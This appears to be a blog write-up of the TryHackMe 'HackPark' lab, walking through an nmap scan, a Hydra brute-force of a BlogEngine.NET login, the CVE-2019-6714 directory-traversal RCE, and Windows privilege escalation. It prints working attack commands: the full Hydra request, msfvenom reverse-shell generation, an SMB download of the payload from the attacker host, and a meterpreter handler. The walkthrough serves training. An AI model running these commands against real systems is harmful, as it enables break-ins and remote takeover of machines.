---
weight: 3
title: "TryHackMe CTF: Hackpark"
date: 2022-10-19T20:13:40+08:00
description: "This is a writeup of the CTF Hackpark on TryHackMe"

title: CTF writeup - Hackpark
featuredImage: tryhackmebanner.jpg
hiddenfeaturedImage: false

tags: ["TryHackMe", "CTF", "Windows", "Webapp", "Privilege Escalation"]
categories: ["Writeups"]

lightgallery: true
summary: This CTF room gives us a tase of some basic penetration testing, enumeration, privilege escalation and web-app testing.
---

# TryHackMe CTF: HackPark
This is a writeup of the CTF Hackpark on TryHackMe. A windows server with IIS and ASP.NET. It includes brute forcing credentials, LFI, Windows system enumeration, exploitation and privilege escalation.

![Untitled](/hackpark/Untitled.png)



# Summary

1. Basic enumeration reveals a web-application with a login portal.
2. Brute forcing the login portal with HYDRA gives us access to a Blog administration dashboard.
3. The Blogengine is running a vulnerable version with a public exploit available.
4. Exploitation is done through a python script which abuses stored themes on the IIS service, running [ASP.NET](http://ASP.NET).
5. LFI is invoked, granting crude shell access within a NetCat TCP session.
6. Under the user context of a low privilege account, “iis_appool”, system enumeration reveals a poorly configured scheduled task.
7. The binary in the scheduled task is swapped out with an SMB reverse shell, 32-bit binary and is executed under the **LocalSystem** user context which gives us a high privilege meterpreter session.

# NMAP

Only 2 services are running on the host. HTTP and RDP.

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sV -Pn -T4 $IP                                 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 15:00 EDT
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 30.20% done; ETC: 15:00 (0:00:07 remaining)
Nmap scan report for 10.10.166.72
Host is up (0.045s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 8.5
3389/tcp open  ssl/ms-wbt-server?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

# Using Hydra to brute-force a HTTP login

There is a login form on the website: http://10.10.166.72/Account/login.aspx?ReturnURL=/admin/

We can try to brute force our way in to this portal.

![Untitled](/hackpark/Untitled%201.png)

## Burp web request

We want to look at the POST request and copy the request into Hydra. This way, we can replace the values of “UserName” and “Password” with ^USER^ / ^PASS^ to be able to fuzz and eventually brute force.

![Untitled](/hackpark/Untitled%202.png)

```bash
# HYDRA Http-post-form
hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form

# Hydra specifically crafted web-request
hydra -v -l admin -P /usr/share/wordlists/rockyou.txt [machineIP] http-post-form "/Account/login.aspx:__VIEWSTATE=%2BzSkE5rKklYx2evyff1oZJyuSWT7%2FP%2BrwCqOuY9eQFnN3I9b9H%2FemK0b4edjD%2BX4D0kYN6MJXUIltXwXt0PReeyBxoseUQg%2BlNpW6CHIGWNzl%2FGSvdwSZX179PJ%2FI3%2F64LNM7KzKj9sc4BMO83WdCE0KH%2FPjXAKd4RAQ7poy1tOiO7cd&__EVENTVALIDATION=8UPWUPAn6s7hJvO0Pl8kCCO3NAmIgs7nlpsgIlY%2FBUKl7fwtvPmUalPJ5PygYkVuz1H356PzRXwi%2FHQ3z8iJpgXHs8%2BloBQ4qlIePP6FdcvcR2qoLptuS0C5xNkNhrzvN5IJshWQx%2BF3kjK4PfMhuSyiPjbKZA2aFsYrqvz5b2BHveGR&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"
[VERBOSE] Page redirected to http://10.10.166.72/
[80][http-post-form] host: **10.10.166.72**   login: **admin**   password: **1qaz2wsx**
[STATUS] attack finished for 10.10.166.72 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-19 15:33:49

```

# Admin Dashboard

After Hydra managed to retrieve the admin credentials, we get redirected to an Administrator dashboard. It seems it is an open source ASP.NET blog management app called “Blogengine.net”. The version is 3.3.6.0.

![Untitled](/hackpark/Untitled%203.png)

# Compromising the machine

Searchsploit quickly reveals that a public exploit is available for this specific version of Blogengine.

![Untitled](/hackpark/Untitled%204.png)

```bash
# The exploit script
┌──(kali㉿kali)-[~]
└─$ cat /usr/share/exploitdb/exploits/aspx/webapps/46353.cs

Exploit Title: BlogEngine.NET <= 3.3.6 Directory Traversal RCE
# Date: 02-11-2019
# Exploit Author: Dustin Cobb
# CVE : CVE-2019-6714
* Attack:
 *
 * First, we set the TcpClient address and port within the method below to
 * our attack host, who has a reverse tcp listener waiting for a connection.
 * Next, we upload this file through the file manager.  In the current (3.3.6)
 * version of BlogEngine, this is done by editing a post and clicking on the
 * icon that looks like an open file in the toolbar.  Note that this file must
 * be uploaded as PostView.ascx. Once uploaded, the file will be in the
 * /App_Data/files directory off of the document root. The admin page that
 * allows upload is:
 *
 * http://10.10.10.10/admin/app/editor/editpost.cshtml
 *
 *
 * Finally, the vulnerability is triggered by accessing the base URL for the
 * blog with a theme override specified like so:
 *
 * http://10.10.41.197/?theme=../../App_Data/files
 *
 */
```

**TLDR;**

1. Start a TCP listener
2. Upload the exploit script through the BlogEngine’s file manager
3. Browse to the base url with a theme override using LFI
4. A reverse shell is spawned and executed

# System enumeration

Once we have an active shell session on the host, we are logged on as the “**iis apppool\blog**” low privilege user. We then perform a quick enumeration of the system to find some useful information and a path to get root access.

There is a running service that stands out among the rest. **“WindowsScheduler”**.
Browsing to the directory belonging to this service reveals a **“Message.exe”** binary that is executed every 30 seconds or so, which we can see in tasklist and the randomly PID assigned to it each time we run tasklist.

It seems to me that the service “WindowsScheduler” is executing this “Message.exe” on a set interval. We can probably abuse this by crafting our own “Message.exe” with a reverse shell payload and elevate our privileges.

```bash
# Interactive reverse NetCat shell
┌──(kali㉿kali)-[~/tryhackme]
└─$ nc -lvnp 6666   
listening on [any] 6666 ...
connect to [10.14.6.6] from (UNKNOWN) [10.10.41.197] 49225
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
whoami
c:\windows\system32\inetsrv>whoami
**iis apppool\blog**

# OS version
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
c:\windows\system32\inetsrv>systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600

# Running services
0         Spooler                   1164       Auto       Running  OK       
0         SystemEventsBroker        744        Auto       Running  OK       
0         TermService               1580       Manual     Running  OK       
0         Themes                    916        Auto       Running  OK       
0         TrkWks                    1400       Auto       Running  OK       
0         UALSVC                    1400       Auto       Running  OK       
0         UmRdpService              1400       Manual     Running  OK       
0         W32Time                   980        Manual     Running  OK       
0         W3SVC                     1416       Auto       Running  OK       
0         WAS                       1416       Manual     Running  OK       
0         Wcmsvc                    888        Auto       Running  OK       
0         **WindowsScheduler**          1444       Auto       Running  OK       
0         WinHttpAutoProxySvc       980        Manual     Running  OK       
0         Winmgmt                   916        Auto       Running  OK       
0         WinRM                     476        Auto       Running  OK

# Information of WindowsScheduler
sc qc WindowsScheduler
c:\windows\system32\inetsrv>sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS
SERVICE_NAME: WindowsScheduler
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

# Running processes
tasklist
C:\Program Files (x86)\SystemScheduler>tasklist
Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0                            0          4 K
System                           4                            0        276 K
smss.exe                       376                            0      1,052 K
csrss.exe                      528                            0      3,528 K
csrss.exe                      584                            1      8,996 K
wininit.exe                    592                            0      3,408 K
winlogon.exe                   620                            1      5,788 K
services.exe                   676                            0      5,240 K
**Message.exe**                    **784**                            1      7,300 K

# Message.exe
C:\Program Files (x86)\SystemScheduler>tasklist /v /fi "IMAGENAME eq Message.exe"
Image Name                     PID Session Name        Session#    Mem Usage Status          User Name                                              CPU Time Window Title                                                            
========================= ======== ================ =========== ============ =============== ================================================== ============ ========================================================================
Message.exe                   **2368**                            1      7,272 K Unknown         N/A                                                     0:00:00 N/A

dir "Message.exe" /s
C:\Program Files (x86)\SystemScheduler>dir "Message.exe" /s
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552
 Directory of C:\Program Files (x86)\SystemScheduler
03/25/2018  10:58 AM           536,992 Message.exe
               1 File(s)        536,992 bytes
     Total Files Listed:
               1 File(s)        536,992 bytes
               0 Dir(s)  39,125,757,952 bytes free

```

# Privilege Escalation

We can use Python SMB server, craft our reverse shell payload and upload it to the victim host. Then rename it to “Message.exe” and let it connect back to us under a privileged user context (LocalSystem).

```bash
# GimmeSH SMB
┌──(kali㉿kali)-[~/tryhackme]
└─$ gimmesh --rev-shell 10.14.6.6 4444 win
msfvenom -p ,windows/meterpreter/reverse_tcp, LHOST=10.14.6.6, LPORT=4444, --platform windows, -a x86,false,false,false,false, -f exe, -o reverse_shell

# SMBServer.py
┌──(kali㉿kali)-[~/tryhackme]
└─$ python2 /opt/impacket-0.9.19/examples/smbserver.py smb .
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Incoming connection (10.10.41.197,49325)
[*] AUTHENTICATE_MESSAGE (\,HACKPARK)
[*] User \HACKPARK authenticated successfully
[*] :::00::4141414141414141

# On Victim host, download the shell
copy \\10.14.6.6\SMB\revshell32bitwin.exe
C:\Program Files (x86)\SystemScheduler>copy \\10.14.6.6\SMB\revshell32bitwin.exe
        1 file(s) copied.
nc.exe -nv 10.14.6.6 4444
C:\Program Files (x86)\SystemScheduler>revshell32bitwin.exe

# Start reverse handler and get a meterpreter session
┌──(kali㉿kali)-[~/tryhackme]
└─$ msfconsole -qx "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.14.6.6; set LPORT 4444; run"

# Rename the shell to get a meterpreter session
ren revshell32bitwin.exe Message.exe
C:\Program Files (x86)\SystemScheduler>ren revshell32bitwin.exe Message.exe

```

### HACKPARK\Administrator

Completing all of the above, we now have Administrator access to the host through an interactive meterpreter session. From here we get the 2 flags “user.txt” and “root.txt”

![Untitled](/hackpark/Untitled%205.png)